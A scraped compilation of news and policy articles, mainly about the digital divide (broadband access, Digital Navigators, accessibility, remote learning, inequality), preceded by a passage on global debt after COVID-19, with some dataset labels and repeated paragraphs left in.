In advanced economies, fiscal deficits soared as countries saw revenues collapse due to the recession and put in place sweeping fiscal measures as COVID-19 spread. Public debt rose 19 percentage points of GDP, in 2020, an increase like that seen during the global financial crisis, over two years: 2008 and 2009. Private debt, however, jumped by 14 percentage points of GDP in 2020, almost twice as much as during the global financial crisis, reflecting the different nature of the two crises. During the pandemic, governments and central banks supported further borrowing by the private sector to help protect lives and livelihoods. Whereas during the global financial crisis, the challenge was to contain the damage from excessively leveraged private sector.

Emerging markets and low-income developing countries faced much tighter financing constraints, but with large disparities across countries. China alone accounted for 26 percent of the global debt surge. Emerging markets (excluding China) and low-income countries accounted for small shares of the rise in global debt, around $1–$1.2 trillion each, mainly due to higher public debt.

Nevertheless, both emerging markets and low-income countries are also facing elevated debt ratios driven by the large fall in nominal GDP in 2020. Public debt in emerging markets reached record highs, while in low-income countries it rose to levels not seen since the early 2000s, when many were benefiting from debt relief initiatives.

Difficult balancing act

The large increase in debt was justified by the need to protect people’s lives, preserve jobs, and avoid a wave of bankruptcies. If governments had not taken action, the social and economic consequences would have been devastating.

But the debt surge amplifies vulnerabilities, especially as financing conditions tighten. High debt levels constrain, in most cases, the ability of governments to support the recovery and the capacity of the private sector to invest in the medium term.

A crucial challenge is to strike the right mix of fiscal and monetary policies in an environment of high debt and rising inflation. Fiscal and monetary policies fortunately complemented each other during the worst of the pandemic. Central bank actions, especially in advanced economies, pushed interest rates down to their limit and made it easier for governments to borrow.

Monetary policy is now appropriately shifting focus to rising inflation and inflation expectations. While an increase in inflation, and nominal GDP, helps reduce debt ratios in some cases, this is unlikely to sustain a significant decline in debt. As central banks raise interest rates to prevent persistently high inflation, borrowing costs rise. In many emerging markets, policy rates have already increased and further rises are expected. Central banks are also planning to reduce their large purchases of government debt and other assets in advanced economies—but how this reduction is carried out will have implications for the economic recovery and fiscal policy.

As interest rates rise, fiscal policy will need to adjust, especially in countries with higher debt vulnerabilities. As history shows, fiscal support will become less effective when interest rates respond—that is, higher spending (or lower taxes) will have less impact on economic activity and employment and could fuel inflation pressures. Debt sustainability concerns are likely to intensify.

The risks will be magnified if global interest rates rise faster than expected and growth falters. A significant tightening of financial conditions would heighten the pressure on the most highly indebted governments, households, and firms. If the public and private sectors are forced to deleverage simultaneously, growth prospects will suffer.

The uncertain outlook and heightened vulnerabilities make it critical to achieve the right balance between policy flexibility, nimble adjustment to changing circumstances, and commitment to credible and sustainable medium-term fiscal plans. Such a strategy would both reduce debt vulnerabilities and facilitate the work of central banks to contain inflation.

Targeted fiscal support will play a crucial role to protect the vulnerable (see the October 2021 Fiscal Monitor ) .

Some countries—especially those with high gross financing needs (rollover risks) or exposure to exchange rate volatility—may need to adjust faster to preserve market confidence and prevent more disruptive fiscal distress. The pandemic and the global financing divide demand strong, effective international cooperation and support to developing countries.

The study, “A Human Approach to Closing the Digital Divide”, surveyed more than 1,500 people nationwide who used Digital Navigator services, interviewed 40 Digital Navigators, and shadowed six Digital Navigator programs. The findings point to the critical role Digital Navigators play in teaching digital skills and increasing Internet adoption in their communities. Additional findings of the study include:

Overall satisfaction with Digital Navigators is very high. Nearly 80% of survey respondents said they were satisfied with the Digital Navigator services they received, and many praised them for quickly fixing their issues and making them feel confident and capable.

Nearly 80% of survey respondents said they were satisfied with the Digital Navigator services they received, and many praised them for quickly fixing their issues and making them feel confident and capable. Although effective, Digital Navigator programs remain underfunded. Many existing Digital Navigator programs operate at a small scale – some organizations responded only being able to support fewer than 50 individuals a year. This challenge limits their capacity to reach the millions of Americans who remain without home Internet, or who face other challenges to fully realize their home Internet connection.

Many existing Digital Navigator programs operate at a small scale – some organizations responded only being able to support fewer than 50 individuals a year. This challenge limits their capacity to reach the millions of Americans who remain without home Internet, or who face other challenges to fully realize their home Internet connection. Digital ecosystem players should take in six key areas to building more effective programs, including diversifying the ranks of Digital Navigators, developing curriculums and assessments, creating mechanisms to share knowledge, more research and evaluation, and execution support.

The new study follows the federal government’s bipartisan infrastructure bill and the Affordable Connectivity Program (ACP), which allocates $14 billion to provide a monthly subsidy to eligible households for broadband service and connected devices. Along with the federal government’s unprecedented investment in broadband infrastructure, the United States has a unique opportunity to reach those who remain without Internet access or digital skills. Digital Navigators can raise awareness and uptake of these low-cost Internet programs and address other barriers to adoption. For instance, data from the Census Bureau and National Telecommunications and Information Administration (NTIA) show that nearly 60 percent of non-adopters point to lack of need or interest as the main reason that they do not subscribe to broadband.

“This study shines a light on the immense contributions of Digital Navigators and unlocks a world of possibilities to get everyone connected to the Internet,” said Broderick Johnson, Executive Vice President, Public Policy and Executive Vice President, Digital Equity, at Comcast. “While the national funding for home Internet subsidies has the potential to be transformative for millions of Americans, this research shows that overcoming the broadband adoption hurdle is necessary to truly maximize this federal investment. For over a decade, Comcast has been committed to digital equity – through our Lift Zones and Internet Essentials programs we have helped millions get online. In supporting Digital Navigator programs, we are broadening our work to close the digital divide by partnering with community-based advocates who are trusted messengers for how access to the Internet has the power to change lives for more Americans. We appreciate the work of the Boston Consulting Group to help us learn more about these important champions for digital equity.”

“Building on top of our 2021 report with this year’s data has empowered us to better understand how the digital divide impacts different communities, and the archetypes of digital navigators that would be required to bridge them,” said Matt Kalmus, Managing Director and Partner, BCG. “The constant result underscoring all of our efforts is that the digital divide will not close without strong coordination between both the public and private sectors.”

In line with the study’s recommendation to support their work, Comcast is investing directly in community-based initiatives and programs to support Digital Navigator and broadband adoption efforts within the communities that it serves as part of Project UP, the company’s comprehensive initiative to advance digital equity. Grant recipients are based in metro areas across the country, including Detroit, Boston, Chicago, Denver, Miami, Houston, Portland and Philadelphia, and more will follow. This investment will go towards launching and scaling up their efforts to help get more people connected to the Internet at home and expand access to digital skills programs.

“Person-to-person connection is essential to helping people get – and stay – online,” said Marvin Venay, Chief Advocacy Officer at Tech Goes Home, a nonprofit organization with more than 20 years of experience in advancing digital equity, and one of the study participants. “Providing high-quality digital devices and affordable internet access is key, but without personalized, culturally-competent support to help utilize those tools, too many people will remain shut out of the opportunities the digital world offers. Increasing the number of digital navigators in our communities will help more people access available resources and ensure that they are able to be online safely, comfortably, and for the long-term.”

Comcast has more than a decade of experience advancing Digital Equity. In 2011, Comcast launched Internet Essentials, the nation’s largest and most successful private-sector low-income broadband adoption program; since launch it has connected over 10 million people to the Internet at home, most for the very first time. It recently launched Internet Essentials Plus, a service that includes high-speed Internet, a cable modem, access to millions of WiFi hotspots, and unlimited data for $29.95 per month. Any Xfinity customer across all Comcast’s markets who qualifies for the Affordable Connectivity Program (ACP) can apply their $30 credit toward their monthly Internet and/or Xfinity Mobile bill. Customers can visit www.xfinity.com/acp, www.internetessentials.com, or call 844-389-4681 for more information, to determine eligibility, and sign up. A dedicated ACP Enrollment and Support Center is available from 8AM to 12AM daily, with multi-lingual capabilities to assist anyone interested in the program.

Project UP: Comcast’s $1 Billion Commitment to Advance Digital Equity

Comcast has been committed to connecting people to the Internet and the technology and skills they need to participate and excel in an increasingly digital world for over a decade. Looking toward the next ten years, Comcast is building on that foundation and expanding its impact through Project UP, a comprehensive initiative to advance digital equity and help build a future of unlimited possibilities.

The EDISON Alliance is launching two new initiatives aimed at further reducing the digital divide: the Lighthouse Countries Network and the Digital Inclusion Navigator.

These initiatives can further the work of the Alliance, and continue to alleviate the roadblocks that currently prevent billions from accessing a critical part of the global economy.

We live in an increasingly digitized world. For many, online commerce, free access to information, and the universal storage and transfer of data have become critical components of 21st-century life.

In fact, I’ve long said that mobility, broadband and cloud services are the 21st century’s infrastructure. And the last two years have never made that more clear.

But progress is not always linear, nor is it equal. While we are witnessing huge advancements in how people connect, we are also witnessing the development of an increasingly problematic divide. A digital divide.

The digital divide

I believe that it shouldn’t matter where you’re born, where you live or how much you make to participate in the digital economy.

As things stand today, a significant proportion of the world’s population is cut off from the digital economy. This problem is three-fold: it’s a lack of accessibility, affordability and/or usability.

From employment opportunities to the provision of healthcare, the COVID-19 pandemic exposed the stark contrast that exists between those that have, and those that do not.

Despite the strong growth in internet use over the past two years, the United Nations’ specialized agency for information and communication technologies, the International Telecommunication Union, recently found that 37% of the world's population – or 2.9 billion people – have still never used the internet. Only a third of the population in Africa is using the internet. Meanwhile, in Europe, 90% of the population is online.

If society is to make full use of its digital capabilities, and meet the many challenges we face as a global community, it’s obvious that something has to change. It is not only our moral imperative, but our duty as leaders.

Digital inclusion

Fortunately, events like the World Economic Forum’s annual gathering in Davos provide leaders with a critical opportunity to focus on some of the world’s most pressing challenges, like digital inclusion, and formulate a path to success.

The event also provides leaders, like myself, with a crucial opportunity to highlight the work that is being done to tackle those barriers, and ensure progress continues to be made in the right direction.

In my role as chairman of the EDISON Alliance, I have seen firsthand how improving connectivity, and facilitating greater digital inclusion, can boost services that are critical to creating an equitable, well-functioning society, including healthcare, finance and education.

For the past year, the EDISON Alliance has been mobilizing a global movement, working with government and industries to prioritize digital inclusion in global agendas as foundational to the achievement of the Sustainable Development Goals – so that everyone can affordably participate in the digital economy. When we launched, we had 22 Champions join the Alliance – from CEOs to Ministers to Heads of International Organization – and today we have 46 active leaders championing digital inclusion.

Notably, last September we launched the 1 Billion Lives Challenge to improve 1 billion lives globally through affordable and accessible digital solutions across health, finance and education by 2025. A third of the EDISON Alliance has already pledged commitments to the 1 Billion Lives Challenge to build digital communities, implement telemedicine programmes, connect schools and children through access to digital technologies.

This year, I am pleased to announce that the EDISON Alliance is launching two new initiatives aimed at further reducing the digital divide.

Lighthouse and Navigator initiatives

The first initiative is called the Lighthouse Countries Network. This new, revolutionary network will build a global group of ‘lighthouse’ countries that will act as accelerators, leveraging the full power of the Alliance as they make concerted efforts to reduce the digital divide that exists in their country.

Global problems require global solutions, and building strong networks is critical to ensuring the entire international community continues to make positive, forward progress.

The second initiative is the launch of the Digital Inclusion Navigator, a one-stop shop of curated, high-quality information, real-world case studies, leading policy papers and other content designed to help advance the adoption of digital inclusion best practices.

Given the inequality that currently exists across the digital ecosystem, it is right that countries with an abundance of experience share their knowledge, so that others can make the most of their expertise and benefit from sharing best practice.

Together, these initiatives can further the work of the Alliance, and continue to alleviate the roadblocks that currently prevent billions of people from accessing an increasingly critical part of the global economy.

I firmly believe that, if we can help empower policymakers, businesses and public bodies with the information they need, they will be better prepared to help us make a real difference where it matters most: their communities.

I would like to invite more organizations and governments to engage with the EDISON Alliance and join the 1 Billion Lives Challenge, so that together we can maximize the potential of technology to bridge the digital divide.

Accessibility fails

Digital accessibility refers to the way people with a lived experience of disability interact with the cyber world.

One example comes from an author of this article, Scott, who is legally blind. Scott is unable to purchase football tickets online because the ticketing website uses an image-based “CAPTCHA” test. It’s a seemingly simple task, but fraught with challenges when considering accessibility issues.

Despite Scott having an IT-related PhD, and two decades of digital accessibility experience in academic and commercial arenas, it falls on his teenage son to complete the online ticket purchase.

Screen readers, high-contrast colour schemes and text magnifiers are all assistive technology tools that enable legally blind users to interact with websites. Unfortunately, they are useless if a website has not been designed with an inclusive approach.

The other author of this article, Justin, uses a wheelchair for mobility and can’t even purchase wheelchair seating tickets over the web. He has to phone a special access number to do so.

Both of these are examples of digital accessibility fails. And they’re more common than most people realise.

We can clearly do better

The term “disability” covers a spectrum of physical and cognitive conditions. It can can range from short-term conditions to lifelong ones.

“Digital accessibility” applies to a broad range of users with varying abilities.

At last count, nearly one in five Australians (17.7%) lived with some form of disability. This figure increases significantly when you consider the physical and cognitive impacts of ageing.

At the same time, Australians are becoming increasingly reliant on digital services. According to a 2022 survey by consulting firm PricewaterhouseCoopers, 45% of respondents in New South Wales and Victoria increased their use of digital channels during the COVID-19 pandemic.

In contrast, research undertaken by Infosys in December 2021 found only 3% of leading companies in Australia and New Zealand had effective digital accessibility processes.

But have we improved?

Areas that have shown accessibility improvement include social media platforms such as YouTube, Facebook and Instagram, food ordering services such as Uber Eats, and media platforms such as the ABC News app.

Challenges still persist in online banking, travel booking sites, shopping sites and educational websites and content.

Data from the United States indicates lawsuits relating to accessibility are on the rise, with outcomes including financial penalties and requirements for business owners to remedy the accessibility of their website/s.

In Australia, however, it’s often hard to obtain exact figures for the scale of accessibility complaints lodged with site owners. This 1997 article from the Australian Human Right Commission suggests the conversation hasn’t shifted much in 25 years.

There are solutions at hand

There’s a clear solution to the digital divide. The World Wide Web Consortium’s Web Content Accessibility Guidelines (WCAG) standard has been widely adopted across the globe. It’s universally available, and is a requirement for all Australian public-facing government websites.

It guides website and app developers on how to use web languages (such as HTML and CSS) in ways that enable end users who rely on assistive technologies. There are no specialist technologies or techniques required to make websites or apps accessible. All that’s needed is an adherence to good practice.

Unfortunately, WCAG is rarely treated as an enforceable standard. All too often, adherence to WCAG requirements in Australia is reduced to a box-ticking exercise.

Our academic work and experience liaising with a range of vendors has revealed that even where specific accessibility requirements are stated, many vendors will tick “yes” regardless of their knowledge of accessibility principles, or their ability to deliver against the standards.

In cases where vendors do genuinely work towards WCAG compliance, they often rely on automated testing (via online tools), rather than human testing. As a result, genuine accessibility and usability issues can go unreported. While the coding of each element of a website might be WCAG compliant, the sum of all the parts may not be.

In 2016, the Australian government adopted standard EN 301549 (a direct implementation of an existing European standard). It’s aimed at preventing inaccessible products (hardware, software, websites and services) entering the government’s digital ecosystem. Yet the new standard seems to have achieved little. Few, if any, references to it appear in academic literature or the public web.

It seems to have met a similar fate to the government’s National Transition Strategy for digital accessibility, which quietly disappeared in 2015.

The carrot, not the stick

Accessibility advocates take different approaches to advancing the accessibility agenda with reticent organisations. Some instil the fear of legal action, often citing the Maguire v SOCOG case, where the 2000 Olympic website was found to be inaccessible.

In a more recent example, the Manage v Coles settlement saw Coles agree to make improvements to their website’s accessibility after being sued by a legally blind woman.

In the Coles case, the stick became the carrot; Coles went on to win a national website accessibility award after the original complainant nominated them following their remediation efforts.

But while the financial impact of being sued might spur an organisation into action, it’s more likely to commit to genuine effort if this will generate a positive return on investment.

Accessible by default

We can attest to the common misconception that disability implies a need for help and support. Most people living with disability are seeking to live independently and with self-determination.

To break the cycle of financial and social dependence frequently associated with the equity space, governments, corporations and educational institutions need to become accessible by default.

The technologies and policies are all in place, ready to go. What is needed is leadership from government and non-government sectors to define digital accessibility as a right, and not a privilege.

The title of the new report poses a question: Can an inclusive future be envisioned in the digital era?","We are living in what has been aptly termed the digital era, a time of rapid technological change led by digital technologies. The new technologies are reshaping economies—and societies. We may be on the cusp of a significant deepening and acceleration of the ongoing digital transformation of our economies and societies as artificial intelligence (AI) generates a new wave of innovations. The COVID-19 pandemic has given added impetus to automation. The future is arriving at a faster pace than expected.

Advances in digital technologies hold great promise. They create new opportunities and avenues to boost economic prosperity and raise human welfare. But they also pose new challenges and risks. As the new technologies transform markets and nearly every aspect of business and work, they have highlighted, and can deepen, economic and social fault lines across advanced and developing economies.

One major fault line is economic inequality, which has been rising in many countries over the period of the boom in digital technologies. The rise in inequality has been more pronounced in advanced economies, notably the United States. Rising inequality and related disparities and anxieties have been stoking social discontent and are a major driver of the increased popular disaffection and political polarization that are so evident today. An increasingly unequal society can weaken trust in public institutions and undermine democratic governance. Rising inequality has emerged as an important topic of political debate and a major public policy concern.

Against this background, a recently published report, An Inclusive Future? Technology, New Dynamics, and Policy Challenges, examines the opportunities and challenges of digital transformation. This report is part of a current initiative at Brookings—Global Forum on Democracy and Technology—that seeks to promote ideas and policies to manage technological change to build inclusive prosperity and strengthen democratic societies.

Technological transformation has been altering market dynamics in ways that push inequality higher within economies. This has been happening through three channels: More unequal distribution of labor income with rising wage inequality as technology shifts labor demand from routine low- to middle-level skills to new, higher-level skills; shift of income from labor to capital with increasing automation and decoupling of wages from firm profitability; and more unequal distribution of capital income with rising market power and rents in increasingly concentrated and winner-takes-all markets. These dynamics are more evident in advanced economies but could increasingly impact developing economies as the new technologies make deeper inroads there.

Not only has inequality been rising, but the expected productivity dividend from digital technologies has not fully materialized. The potential of the new technologies to deliver higher productivity and economic growth is sizable. But productivity growth has slowed rather than accelerated in many economies as digital technologies have boomed. Firms at the technological frontier have captured the lion’s share of the returns from the new technologies. Productivity growth in these firms has been strong, but it has stagnated or slowed in other firms, depressing aggregate productivity growth. With slower productivity growth, economic growth has trended lower. So, the proverbial economic pie is not only more unequally distributed, it is also growing more slowly.

Looking ahead, absent countervailing policies, AI and related new waves of digital technologies and automation could increase inequality further. Even as new technologies increase productivity and produce greater economic affluence, and new jobs and tasks emerge to replace those displaced to prevent large technological unemployment, inequality could reach much higher levels. Continuing and large increases in inequality may not be a sustainable path given associated social and political risks.

While within-country inequality has been rising, inequality between countries has been falling. Faster-growing emerging economies have been narrowing the income gap with advanced economies. But technological change poses new challenges for this global economic convergence. Manufacturing-led growth in emerging economies has been driven by their comparative advantage in labor-intensive manufacturing based on large populations of low-skilled, low-wage workers. This source of comparative advantage increasingly will erode as automation of low-skilled work expands, disrupting traditional pathways to development.

The title of the new report poses a question: Can an inclusive future be envisioned in the digital era? The answer to that question is yes. Large and persistent increases in inequality are not an inevitable consequence of technology.

The challenge for policymakers lies in harnessing transformative change spawned by current and prospective advances in technology to promote more inclusive growth and development. Public policy in general has been slow to rise to the challenge. Policies have lagged shifting growth and distributional dynamics as technology reshaped markets, business models, and the nature of work. The result has been both a failure to capture the full productivity potential of the new technologies and a failure to counteract some of the effects of these technologies that increase economic inequality. With more responsive policies, better outcomes are possible.

The reform agenda spans product and factor markets to enable broader participation of firms and workers in the opportunities created by the new technologies. It includes competition policy, regulatory frameworks governing the new digital economy, the innovation system, education and training, labor market policies and social protection, and policies to reduce the digital divide. It also includes tax policy reform. A theme unifying much of this reform agenda is that, in capturing the full promise of digital transformation, economic growth and inclusion are not competing but complementary objectives.

In many of these areas of national policy reform, more research, fresh thinking, and experimentation will be needed to align institutions and policies with the profound technology-driven changes in the functioning of markets and economies. At the international level, new global frameworks and rules will be needed as globalization goes increasingly digital.

Technology can potentially slow global economic convergence by altering patterns of comparative advantage. But as it disrupts some traditional pathways to growth and development, it also offers new opportunities for developing countries that successfully recalibrate their growth models to the new technological paradigm.

Adapting to the new technologies is a big challenge for policymakers. But that is not the only challenge. A related challenge is to shape technological change itself to put it to work for broader groups of people and better meet the needs and interests of economies and societies.",Digital Inequality,2022-06-01 07:00:00

By analyzing responses from structured interviews with a sample of 21 K-12 public school teachers, the researchers found students in lower-income school districts experienced inequities in online teaching and learning opportunities, compared with students in middle-income and wealthier districts.
“Across all income levels, elementary school teachers also reported that younger students struggled to use the available e-learning technologies without significant intervention of home caretakers,” she said.
These gaps persisted at the start of the pandemic and set a digital inequality backdrop for the implementation of predominantly online remote learning, Reynolds said.

By analyzing responses from structured interviews with a sample of 21 K-12 public school teachers, the researchers found students in lower-income school districts experienced inequities in online teaching and learning opportunities, compared with students in middle-income and wealthier districts. The open-access study was published in the Journal of the Association for Information Science and Technology.

“While the pandemic created challenging emergency remote teaching conditions for students across income backets, teachers from lower-income districts reported more challenges in students’ consistent access to working, functioning computers, issues with networking connectivity and bandwidth, and gaps in prior student and family digital literacy needed to effectively use e-learning tools,” said Rebecca Reynolds, an associate professor in the Rutgers School of Communication and Information and lead author of the study.

“Across all income levels, elementary school teachers also reported that younger students struggled to use the available e-learning technologies without significant intervention of home caretakers,” she said. “This was in part because design of corporate e-learning platforms such as Google Classroom, which were used almost ubiquitously, did not meet the developmental needs of K-12 students for structured learning as novices.”

In spring 2020, at the beginning of the state’s pandemic lockdown, 584 school districts were required to develop plans for emergency remote teaching. While funds from the Coronavirus Aid, Relief, and Economic Security Act contributed significantly to technology purchases, beyond a PDF list of suggestions for online-learning platforms, districts received little guidance from the state on structuring online classes, choosing technology or paying for online service licenses.

That left district administrators and K-12 teachers essentially on their own to develop lesson plans and decide how to deliver them, Reynolds said. In some cases, teachers even paid one another out of pocket for lesson plan guidance and online-learning tips.

Complicating the shift to remote instruction was an already present digital divide. In 2017, nearly half of New Jersey households earning $20,000 or less were without internet access, compared to 6 percent of households earning $75,000 or more, according to U.S. Census data.

These gaps persisted at the start of the pandemic and set a digital inequality backdrop for the implementation of predominantly online remote learning, Reynolds said.

Other key findings include:

Compared with higher income districts, teachers in lower-income districts appeared to report larger attendance gaps as barriers to online instructional delivery, reporting student absences ranging between 30 percent and 50 percent during the initial lockdown.

Shortages in devices, particularly in lower-income districts during this timeframe, requiring children within families to share school-issued laptops (one-per-family).

An overreliance on online-learning technologies not tested for evidence-based effectiveness in supporting student learning processes and outcomes.

Elevated anxiety and stress among teachers and students.

“One thing we hope is that every district in the state is doing a retrospective audit of what they learned and what they need to do differently, including consulting with experts, in case we find ourselves in a similar situation moving forward,” Reynolds said. “By consulting with experts to employ targeted, evidence-based e-learning solutions, they may learn some things about improving e-learning affordances offered under regular in-person instructional delivery conditions, too.”",Digital Inequality,2022-05-18 07:00:00

But doing so requires a clearer definition of the digital divide, avoiding the over-emphasis on a device and a home broadband connection.
Otherwise, we will have squandered the best opportunity in decades to close the digital divide.","The term “digital divide” has moved into the mainstream, as the pandemic revealed how unforgiving life can be for those disconnected from the internet. As Americans have been forced to work, learn, and socialize from home, many in rural and low-income communities have found getting and staying online a major challenge.

At $65 billion, broadband funding from the now enacted Infrastructure Investment and Jobs Act (IIJA), will be the largest-ever digital infrastructure investment and the first since the 2009 American Recovery and Reinvestment Act (ARRA), which allocated $4.7 billion to close the digital divide.

The National Telecommunications and Information Administration (NTIA) will play the biggest role in the distribution of these funds, allocating $48.2 billion of the $65 billion to states for broadband deployment and adoption. Poised to distribute the largest pot of money to expand affordable, high-speed broadband access and digital inclusion programs, policymakers and even some advocacy groups must first focus on defining the problem and expected outcomes in order for this to work.

The digital divide dates to the early 2000s, when former NTIA Assistant Secretary Larry Irving called out the concept, offering a then-binary view into disparate access to technology. The digital divide depicted those with and without access to the internet, a compatible device, or both. Back then, digital literacy programs were critical because some policymakers and advocates believed that poor people needed computer basics, like how to use email and word processing programs.

Today, the need for computer skills and access has grown exponentially, changing how individuals interact. Yet politicians have still failed to bridge the digital divide, having previously expended resources on program models that have not necessarily scaled or sustained digital inclusion before the pandemic. Even with IIJA funds, the federal government will once again fail to address digital disparities without a clear definition of the problems being solved and a lack of substantive feedback from local stakeholders who understand the conditions of their communities.

Part of this failure rests on the reliance of policymakers on regulatory guidance from communications policies drafted before the contemporary internet, and their sole focus on accelerating broadband access instead of economic mobility and social justice for the digitally disenfranchised. If prior policies worked well to close the digital divide, we would not be racing to the bottom to ensure equitable access. Getting people connected to affordable broadband and a device are only partial solutions to narrowing the digital divide. We often forget that people still need the required financial collateral like a bank or credit card to take advantage of now-digitized services like ridesharing and e-commerce.

Which brings me to this: The severity of the digital divide goes beyond the usual analogy of a three-legged stool — broadband availability, affordability, and digital literacy. Policymakers must acknowledge that efforts to close the digital divide should also address poverty, geographic, and social isolation.

Put simply, people not online still face systemic societal inequalities, only this time within new systems and applications like telehealth, online vaccination scheduling, or online job applications. All while still relegated to second-class, digital citizenship. These are points that I make in my forthcoming book, “Digitally Invisible: How the internet is creating the new underclass” (Brookings Press, 2022), which draws upon the experiences of everyday people, from farmers to students of color, already neglected by our nation before the pandemic further devastated their households, businesses, and communities.

If their voices are not included before federal support is released, bureaucrats will turn to familiar paradigms about the digital divide that bypass the role of technology in confronting larger social inequalities. That is why federal and state governments must deliver a “hand up” rather than a paternalistic “hand out” to mitigate digital disparities. Government agencies, alongside anchor institutions and community partners, must work toward the institutionalization and intuitive familiarity of digital use within urban and rural communities.

The next few months should not be a rush to play catch up for the millions of left-behind Americans. Instead, the U.S. should be focused on moving people and their communities from consumers to producers and innovators who are prepared to accelerate our global, digital competitiveness.

But doing so requires a clearer definition of the digital divide, avoiding the over-emphasis on a device and a home broadband connection.

National efforts must bring new and diverse voices to the table who understand that being connected can bridge the economic and social divides faced by their residents and local constituents. Otherwise, we will have squandered the best opportunity in decades to close the digital divide.",Digital Inequality,2022-01-11 08:00:00

While this problem is often talked about as a simple problem of access to broadband internet service, it is deeper and more complex than mere infrastructure. In truth, the digital divide also is a problem of inclusivity, institutions, and individual proficiency, and a solution needs to address all four dimensions. Policymakers should: 1) pay for improvements using a “Romer” tax levied on digital ads, 2) coordinate locally appropriate solutions, 3) recruit Big Tech and major internet service providers to help close gaps, 4) invite public-private solutions, 5) update and expand existing affordability programs, 6) build in future-proofing, and 7) invest in digital literacy.

Finally, America appears to be taking bold action on fixing its fraying infrastructure. President Joe Biden’s proposed American Jobs Plan — despite being negotiated down in a bipartisan deal — is a significant step in addressing one the of the country’s most pressing, deeply rooted, and often overlooked problems: The plan contains a $65 billion budget spread over eight years to close the gaps in the digital infrastructure.

It’s a major investment. Unfortunately, it still falls well short of what’s needed to actually solve the problem. According to our analyses, the budget should have been two and half times as large as the original $100 billion. Let me explain why and what can be done to move forward.

It’s long been acknowledged that even as the digital industry exploded out of this country, America lived with a “digital divide.” While this is loosely understood as the gap between those who have access to reliable internet service and those who don’t, the true nature and extent of the divide is often under-appreciated. Internet infrastructure is, of course, an essential element of the divide, but infrastructure alone does not necessarily translate into adoption and beneficial use. Local and national institutions, affordability and access, and the digital proficiency of users, all play significant roles — and there are wide variations across the United States along each of these.

As part of our research initiative, Imagining a Digital Economy for All (IDEA) 2030 (established in collaboration with the Mastercard Center for Inclusive Growth), we disaggregated the digital divide into four distinct components and scored the 50 states along each of these:

Infrastructure: Internet speeds; terrestrial broadband coverage; smartphone usage.

Inclusivity: Affordability of broadband; equity of broadband access across income groups; actual usage of the internet at broadband speeds.

Institutions: Political prioritization of broadband strategy; best practices of government use of technology for public services; restrictions on alternative local broadband solutions, such as municipal networks.

Digital Proficiency: How well people can navigate the digital world, which is shaped by demographic profile, education levels, political tolerance, degree of skepticism about news sourced from social media.

The state of the digital divide across all 50 states can be visualized in the exhibit below.

The Digital Divide Reinforces Divides in Key Services

The inability to use the internet pushes access to many essential services out of reach. Often, this compounds other inequities and historical injustices.

Consider telehealth, an essential lifeline post-pandemic — particularly with a surge in mental health consultations. Even as many states expanded telehealth policies to accommodate this surge, our research shows that the digital divide hampered access in New Mexico, Montana, Vermont, and Iowa. Other states, including West Virginia, Alabama, Oklahoma, Indiana, Missouri, Tennessee, and South Carolina, were slow in expanding their policies and are poor in terms of digital access as well.

A parallel story played out with schools. As more than 55 million students moved to online learning during the pandemic, one in five teens, ages 13 to 17, reported being unable to do their homework “often” or “sometimes” because of unreliable Internet access. Twelve million children were without internet access altogether. The challenges varied by location. To consider an extreme example, 70% of children in the Kansas City school district did not have internet access at home, a problem made worse by the fact that Missouri only spends about $10,600 per pupil, which puts it near the bottom third compared to other states.

The digital divide also reinforces racial inequity. Nearly half of Americans without at-home internet were in Black and Hispanic households. With a 14-point gap in broadband access between white and Black households with school-going children, and a 12-point gap between white and Hispanic households, we find that up to 40% of disconnected K-12 students from Black, Latino, and indigenous communities struggle with insufficient digital literacy, language obstacles, and other disincentives to use the internet and find ways to gain better access.

The digital divisions are likely to keep these historic disadvantages in place in the future. Seventy percent of Black and 60% of Hispanic respondents report being underprepared with digital skills, affecting their employability. While a third of all white workers in 2018 were in jobs they could do from home, less than 20% percent of Black workers and only 16% percent of Hispanic workers were in jobs that could be done remotely. Without additional intervention to close this divide, a majority of Black and Hispanic workers could be locked out of 86% of jobs by 2045.

The divide has economic costs overall. Access to reliable internet is also a strong predictor of economic opportunity. According to a Deloitte study, a 10% increase in broadband access in 2014 would have resulted in more than 875,000 additional U.S. jobs and $186 billion more in economic output in 2019. The shift to remote work has been an opportunity to spread talent and economic benefits across the country — 14 to 23 million Americans say they intend to relocate to a different city or region, according to a study by Upwork, and many already have. But while several cities and states have been offering incentives for inbound moves, most of the regions eager for inbound moves also have some of the largest digital gaps. Consider West Virginia, where the governor is offering $12,000 to remote workers. But according to our analyses, West Virginia ranks 50 out of 50 in infrastructure and digital literacy, 46 in inclusivity and 19 in institutions. Sixty-two percent of urban West Virginia does not use the internet at broadband speeds.

The Digital Divide is Deeper Than We Think — But We Can Still Fix It

Biden’s original infrastructure budget proposed $100 billion for digital infrastructure. While large, it is actually not large enough: It mirrored a parallel proposal in Congress, which, in turn, drew upon a 2017 FCC estimate that it would cost $80 billion to expand broadband access to every household. These budgets use an incorrect FCC mapping of access to the country’s digital infrastructure, which pegs the broadband disconnected at “fewer than 14.5 million,” which even the current acting FCC chair, Jessica Rosenworcel, acknowledges is an undercount. A more reliable “manual” check by the research group, BroadbandNow, estimated 42 million Americans were without broadband; factoring in other challenges in getting people to actually use the service, that number of people not using broadband is arguably much higher.

Using the FCC’s cost structures on these revised figures, our research team analyses the budget need to be at least $240 billion — $175 billion more than the $65 billion allocated under the terms of the current bipartisan deal. The number could be even higher, as the Biden American Jobs Plan fact sheet calls for “future-proof” broadband and the need to upgrade the nation’s broadband standards to enable high bandwidth-using applications such as streaming video and Zoom conferencing that have proved to be essential through the pandemic. While the Biden team insists it has creative ways to stretch the tighter budget, it still needs new revenue sources and opportunities to save on costs.

Fixing the digital divide ought to be a priority as it sits at the center of numerous other societal problems, ranging from racial inequities to unevenness of access to essential needs, including health care and education. The execution will need to be locally appropriate and must go beyond filling in physical infrastructure.

I have several recommendations for action. They will require leadership and collaboration across government and business at the federal and local levels.

